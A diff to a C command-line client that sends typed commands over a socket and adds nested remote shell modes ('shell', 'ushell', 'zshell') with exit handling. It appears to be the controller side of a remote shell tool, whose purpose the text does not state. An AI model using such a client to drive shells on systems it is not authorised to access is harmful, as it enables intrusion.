@@ -107,7 +107,8 @@ int main(int argc, char *argv[])
 			buff[i] = 0;
 		}
 
-		printf("COMMAND> ");
+		if(!shell)
+			printf("COMMAND> ");
 
 		fgets(command, sizeof(command), stdin);
 
@@ -122,22 +123,35 @@ int main(int argc, char *argv[])
 			continue;
 		}
 
-		if(!strcmp(command, "shell\n"))
-			shell++;
-
 		write(sock, command, strlen(command));
+
+		if(!strcmp(command, "shell\n") || !strcmp(command, "shell2\n"))
+		{
+			shell++;
+			continue;
+		}
+		else if(!strcmp(command, "ushell\n") || !strcmp(command, "zshell\n"))
+			shell++;
 
 		//FOR COMMAND DEBUGGING
 		//for command specific debugging printing back command
 		//read(sock, buff, sizeof(buff));
 		//puts(buff);
 
-		read(sock, buff, sizeof(buff));
-		puts(buff);
+		if(!(!strcmp(command, "exit") && shell))
+		{
+			read(sock, buff, sizeof(buff));
+			puts(buff);
+		}
 
 		if(!strcmp(command, "exit"))
-			return 1;
+		{
+			if(shell)
+				shell--;
+			else
+				return 1;
 
+		}
 	}
 
 
